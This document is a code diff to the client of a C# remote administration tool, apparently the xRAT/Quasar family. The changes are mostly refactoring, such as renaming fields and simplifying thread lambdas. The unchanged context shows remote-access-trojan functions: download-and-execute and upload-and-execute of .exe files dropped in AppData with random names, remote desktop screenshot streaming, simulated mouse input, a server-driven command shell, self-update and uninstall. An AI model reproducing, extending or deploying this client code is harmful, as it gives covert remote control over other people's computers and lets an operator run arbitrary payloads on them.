@@ -23,8 +23,8 @@ namespace xClient.Core.Commands
 		[DllImport("user32.dll")]
 		private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
 
-		private static Bitmap lastDesktopScreenshot = null;
-		private static Shell shell = null;
+		public static Bitmap LastDesktopScreenshot;
+		private static Shell _shell;
 
 		private const int MOUSEEVENTF_LEFTDOWN = 0x02;
 		private const int MOUSEEVENTF_LEFTUP = 0x04;
@@ -41,7 +41,7 @@ namespace xClient.Core.Commands
 		{
 			new Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".exe"));
 
@@ -87,12 +87,12 @@ namespace xClient.Core.Commands
 				}
 
 				new Packets.ClientPackets.Status("Executed File!").Execute(client);
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
 		{
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
 
@@ -123,7 +123,7 @@ namespace xClient.Core.Commands
 				}
 
 				new Packets.ClientPackets.Status("Executed File!").Execute(client);
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
@@ -211,30 +211,24 @@ namespace xClient.Core.Commands
 
 		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
 		{
-			if (lastDesktopScreenshot == null)
+			if (LastDesktopScreenshot == null)
 			{
-				lastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
+				LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
 
-				byte[] desktop = Helper.Helper.CImgToByte(lastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
+				byte[] desktop = Helper.Helper.CImgToByte(LastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
 
 				new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
-
-				desktop = null;
 			}
 			else
 			{
-				using (Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number))
+			    Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
+				using (Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(LastDesktopScreenshot, currentDesktopScreenshot))
 				{
-					using (Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot))
-					{
-						lastDesktopScreenshot = currentDesktopScreenshot;
+					LastDesktopScreenshot = currentDesktopScreenshot;
 
-						byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
+					byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
 
-						new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
-
-						desktop = null;
-					}
+					new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 				}
 			}
 		}
@@ -451,7 +445,7 @@ namespace xClient.Core.Commands
 			// i dont like this updating... if anyone has a better idea feel free to edit it
 			new Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".exe"));
 
@@ -518,7 +512,7 @@ namespace xClient.Core.Commands
 					new Packets.ClientPackets.Status("Update failed!").Execute(client);
 					return;
 				}
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
@@ -528,23 +522,23 @@ namespace xClient.Core.Commands
 
 		public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
 		{
-			if (shell == null)
-				shell = new Shell();
+			if (_shell == null)
+				_shell = new Shell();
 
 			string input = command.Command;
 
 			if (input == "exit")
 				CloseShell();
 			else
-				shell.ExecuteCommand(input);
+				_shell.ExecuteCommand(input);
 		}
 
 		public static void CloseShell()
 		{
-			if (shell != null)
+			if (_shell != null)
 			{
-				shell.CloseSession();
-				shell = null;
+				_shell.CloseSession();
+				_shell = null;
 			}
 		}
 
